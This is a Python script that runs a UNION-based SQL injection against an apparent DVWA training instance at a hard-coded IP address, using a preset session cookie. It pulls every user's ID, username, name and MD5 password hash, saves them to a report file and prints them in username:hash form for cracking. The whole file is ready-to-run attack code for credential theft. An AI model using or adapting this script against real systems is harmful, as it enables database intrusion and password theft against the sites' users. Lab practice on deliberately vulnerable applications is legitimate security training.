
import requests
import re
import html

# Create session and set cookies
session = requests.Session()
session.cookies.set('PHPSESSID', 'u1sbabk40idi42696eoie42qk7')
session.cookies.set('security', 'low')

url_base = "http://31.97.117.123"
sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[+] ===== EXTRACTING ALL USERS INCLUDING ADMIN =====\n")

# Query to get all users with complete information
payload = "999' UNION SELECT CONCAT(user_id,':',user,':',first_name,':',last_name), password FROM users -- -"

print(f"[*] SQL Injection Payload: {payload}\n")

try:
    response = session.get(sqli_url, params={'id': payload, 'Submit': 'Submit'}, timeout=10)
    
    # Find all <pre> blocks
    pre_blocks = re.findall(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
    
    users_found = []
    
    for block_idx, block in enumerate(pre_blocks):
        block_decoded = html.unescape(block)
        lines = block_decoded.split('<br />')
        
        if len(lines) >= 3:
            firstname_line = lines[1]
            surname_line = lines[2]
            
            firstname_match = re.search(r'First name:\s*(.+?)$', firstname_line)
            hash_match = re.search(r'Surname:\s*(.+?)$', surname_line)
            
            if firstname_match and hash_match:
                user_info = firstname_match.group(1).strip()
                password_hash = hash_match.group(1).strip()
                
                # Parse concatenated data: user_id:username:first_name:last_name
                parts = user_info.split(':')
                if len(parts) >= 4:
                    user_id = parts[0]
                    username = parts[1]
                    first_name = parts[2]
                    last_name = parts[3]
                    
                    users_found.append({
                        'user_id': user_id,
                        'username': username,
                        'first_name': first_name,
                        'last_name': last_name,
                        'password_hash': password_hash
                    })
                    print(f"[+] Found: ID={user_id}, User={username}, Name={first_name} {last_name}, Hash={password_hash}")
    
    if users_found:
        print(f"\n[+] ===== SUCCESSFULLY EXTRACTED {len(users_found)} USER(S) =====\n")
        
        # Display in table format
        print("=" * 150)
        print(f"{'ID':<5} | {'Username':<20} | {'First Name':<20} | {'Last Name':<20} | {'Password Hash (MD5)':<60}")
        print("=" * 150)
        for user in users_found:
            print(f"{user['user_id']:<5} | {user['username']:<20} | {user['first_name']:<20} | {user['last_name']:<20} | {user['password_hash']:<60}")
        print("=" * 150)
        
        # Save comprehensive report
        with open('/tmp/complete_user_extraction_final.txt', 'w') as f:
            f.write("=" * 150 + "\n")
            f.write("COMPLETE USER DATA FROM DVWA - SQL INJECTION EXTRACTION\n")
            f.write("=" * 150 + "\n\n")
            
            f.write("SQL INJECTION PAYLOAD USED:\n")
            f.write(f"  {payload}\n\n")
            
            f.write(f"{'ID':<5} | {'Username':<20} | {'First Name':<20} | {'Last Name':<20} | {'Password Hash (MD5)':<60}\n")
            f.write("-" * 150 + "\n")
            for user in users_found:
                f.write(f"{user['user_id']:<5} | {user['username']:<20} | {user['first_name']:<20} | {user['last_name']:<20} | {user['password_hash']:<60}\n")
            f.write("=" * 150 + "\n\n")
            
            f.write("DETAILED USER INFORMATION:\n")
            f.write("-" * 150 + "\n")
            for idx, user in enumerate(users_found, 1):
                f.write(f"\n[{idx}] USER RECORD:\n")
                f.write(f"    User ID:        {user['user_id']}\n")
                f.write(f"    Username:       {user['username']}\n")
                f.write(f"    First Name:     {user['first_name']}\n")
                f.write(f"    Last Name:      {user['last_name']}\n")
                f.write(f"    Full Name:      {user['first_name']} {user['last_name']}\n")
                f.write(f"    Password Hash:  {user['password_hash']}\n")
                f.write(f"    Hash Type:      MD5 ({len(user['password_hash'])} characters)\n")
            
            f.write("\n" + "=" * 150 + "\n")
            f.write("PASSWORD CRACKING FORMAT (username:hash):\n")
            f.write("-" * 150 + "\n")
            for user in users_found:
                f.write(f"{user['username']}:{user['password_hash']}\n")
            
            f.write("\n" + "=" * 150 + "\n")
            f.write("EXTRACTION SUMMARY:\n")
            f.write(f"  Total Users Extracted: {len(users_found)}\n")
            f.write(f"  Extraction Method: SQL Injection (UNION SELECT with CONCAT)\n")
            f.write(f"  Database: DVWA (Damn Vulnerable Web Application)\n")
            f.write(f"  Target Table: users\n")
            f.write(f"  Extracted Columns: user_id, user, first_name, last_name, password\n")
            f.write(f"  Vulnerable Parameter: id (GET)\n")
            f.write(f"  Attack Vector: UNION-based SQL Injection\n")
            f.write(f"  Target URL: http://31.97.117.123/vulnerabilities/sqli/\n")
            f.write("=" * 150 + "\n")
        
        print(f"\n[+] Complete data saved to: /tmp/complete_user_extraction_final.txt")
        print(f"\n[*] SUMMARY:")
        print(f"    - Total users extracted: {len(users_found)}")
        print(f"    - Hash type: MD5")
        print(f"    - Database: DVWA")
        
        # Display hashes for cracking
        print("\n[*] Hashes for cracking (username:hash format):")
        print("-" * 80)
        for user in users_found:
            print(f"{user['username']}:{user['password_hash']}")
        
    else:
        print("[-] No user data could be extracted")
    
except Exception as e:
    print(f"[-] Error during extraction: {e}")
    import traceback
    traceback.print_exc()

